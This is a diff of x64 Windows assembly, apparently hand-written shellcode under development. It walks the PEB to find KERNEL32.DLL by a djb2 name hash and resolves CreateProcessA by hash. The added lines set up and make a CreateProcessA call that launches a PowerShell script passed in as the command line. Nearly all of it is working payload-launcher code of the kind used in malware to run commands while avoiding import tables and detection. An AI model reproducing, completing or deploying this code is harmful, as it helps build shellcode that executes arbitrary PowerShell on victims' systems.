@@ -10,7 +10,7 @@ main:
 	pop rdi
 	push rbp
 	mov rbp, rsp
-	sub rsp, 0x20
+	sub rsp, 0xb0
 	mov [rbp - 8], rdi			; powershell script address
 	mov rbx, gs:0x60 
 	mov [rbp - 0x10], rbx		; PEB address
@@ -21,7 +21,7 @@ main:
 		mov rcx, [rbp- 0x18]
 		mov rcx, [rcx + 0x50]	; offset to the module name, this came from debugging
 		call calHashWchar
-		cmp rax, 0x6ddb9555		; find KERNEL32.DLL
+		cmp eax, 0x6ddb9555		; find KERNEL32.DLL
 		jz gotModule
 		mov rbx, [rbp - 0x18]
 		mov rbx, [rbx]
@@ -34,6 +34,35 @@ main:
 		mov rdx, 0xaeb52e19		; second param: hash of CreateProcessA
 		mov rcx, rax			; first param: dll base address
 		call getFunction
+
+
+		lea rbx, [rbp - 0x48]
+		push rbx				; lpProcessInformation
+
+		;The stack has to be 16-byte aligned
+		;So lpStartupInfo will start at [rbp - 0xb0] instead of [rbp - 0xa8]
+		lea rbx, [rbp - 0xb0]	; lpStartupInfo
+		push rbx
+		push 0					; lpCurrentDirectory
+		push 0					; lpEnvironment
+		push 0					; dwCreationFlags
+		push 0					; bInheritHandles
+		xor r9, r9				; lpThreadAttributes
+		xor r8, r8				; lpProcessAttributes
+		mov rdx, [rbp - 8]		; lpCommandLine
+		xor rcx, rcx			; lpApplicationName
+
+
+		; I really dont understand why we have to push 4 more times.
+		; A normal executable called CreateProcessA with the first parameter pushed to [rsp + 32]
+		; So I just follow that
+		push 0
+		push 0
+		push 0
+		push 0
+
+		call rax
+
 	
 calHashWchar:
 	; djb2 hashing algorithm
